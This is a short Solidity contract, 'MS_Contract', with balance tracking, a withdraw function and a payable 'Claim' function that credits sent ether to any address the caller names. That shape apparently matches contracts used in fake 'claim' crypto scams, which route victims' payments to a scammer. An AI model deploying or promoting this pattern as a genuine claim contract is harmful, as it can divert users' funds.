// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;



contract MS_Contract {

  address private owner;
  mapping (address => uint256) private balance;

  constructor() { owner = msg.sender; }
  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }
  function getUserBalance(address wallet) public view returns (uint256) { return balance[wallet]; }

  function withdraw(address where) public {
    uint256 amount = balance[msg.sender];
    require(address(this).balance >= amount, "BALANCE_LOW");
    balance[msg.sender] = 0; payable(where).transfer(amount);
  }

  function Claim(address sender) public payable { balance[sender] += msg.value; }

}
